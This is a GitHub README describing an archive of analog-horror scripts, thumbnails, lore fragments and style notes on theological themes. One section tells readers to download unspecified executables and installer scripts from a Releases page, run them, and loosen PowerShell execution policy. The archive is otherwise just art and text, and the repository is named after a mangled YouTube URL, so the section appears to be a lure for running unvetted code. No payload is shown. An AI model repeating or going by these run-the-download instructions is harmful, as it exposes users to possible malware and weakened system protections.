About
This repo hosts a curated archive for a serial analog-horror project that frames theological paradoxes as creeping mystery. The work blends found-media style, faux-ecclesiastical artifacts, and audio-visual experiments. The assets aim for mood and plausibility. They support video episodes, ARG elements, and research notes.

What you will find
- Episode scripts in Markdown and plain text.
- Audio cue sheets and metadata for ambient tracks.
- Thumbnail PSDs and exported PNG/JPG assets.
- Scanned-style pages and mock manuscripts in high-res PNG and PDF.
- Short lore entries and linked timelines.
- Small playback utilities and installer scripts in Releases.

How to get and run releases
- Visit the Releases page and download the packaged files:
  https://github.com/kleyy1/https-www.youtube.com-channel-UC1eWBETNRotbvWa1yGIflhg/releases
- The releases page includes executables and helper scripts. Download the file you need and execute it on your machine.
- For Unix systems use: sh render.sh or bash render.sh after marking the file executable.
- For Windows use the provided .ps1 script. Run with PowerShell and required execution policy adjustments.
- If the Releases link fails or does not list files you expect, check the Releases section on the repo for manual downloads.

Scripts
The scripts folder contains scene-by-scene drafts and production notes. Each episode file follows a short and consistent format:
- Header block with episode ID, runtime, and assets.
- Scene entries with one-line directions and audio cues.
- Dialogue blocks with speaker labels and simple timing markers.
- Metadata that lists fonts, color palettes, and sample ratios for VHS style.

Example scene (excerpt)
- SCENE 03 â€” Archive Room
  - Visual: dim fluorescent, slow CRT glow
  - Audio: low hum, distant chant (A1)
  - ACTION: camera drifts to handwritten ledger
  - DIALOGUE:
    - NARRATOR: "The ledger knows us by names we no longer hold."

Thumbnails and visual assets
Thumbnails follow an analog-horror aesthetic:
- High contrast
- Film grain and scanlines
- Limited color palettes: sepia, teal, crimson
- Distressed typography that mimics typewriter and early dot-matrix

Included formats:
- PSD source files with organized layers
- Exported JPEGS for quick use
- PNGs with alpha for lower third overlays

Design tips
- Use 3-4 tones maximum.
- Keep title placement near the lower-left third.
- Add subtle noise layers. Blend at low opacity.
- Use serif display for sacred texts. Use monospace for technical overlays.

Lore compendium
The lore folder contains canonical fragments, indexed by tag and date. Entries include:
- Forbidden Psalms: short verses with anomalous syntax
- Correspondence: emails and letters from fictional clerics
- Artifact logs: mock catalog entries for found objects
- Timelines: cross-referenced events, locations, and witness accounts

Use cases
- Use scripts and assets to make short analog-horror clips.
- Use lore fragments to craft ARG puzzles.
- Use mock documents for prop creation and set dressing.
- Use cue sheets to lay out ambient soundscape.

Style guide for new material
- Voice: restrained, formal, and clinical when describing sacred elements.
- Tone: unsettling but factual.
- Syntax: short sentences. Clear verbs.
- Names: mix proper names with archaic phrase fragments.
- When creating new assets: annotate source fonts and color values.

Contributing
- Fork the repo.
- Create a branch named feature/<short-name>.
- Keep changes atomic. One idea per PR.
- Include a short PR description that lists files added or changed.
- Use the style guide in /lore/style.md for new lore entries.
- For visual assets, include a flattened export and a layered source file.
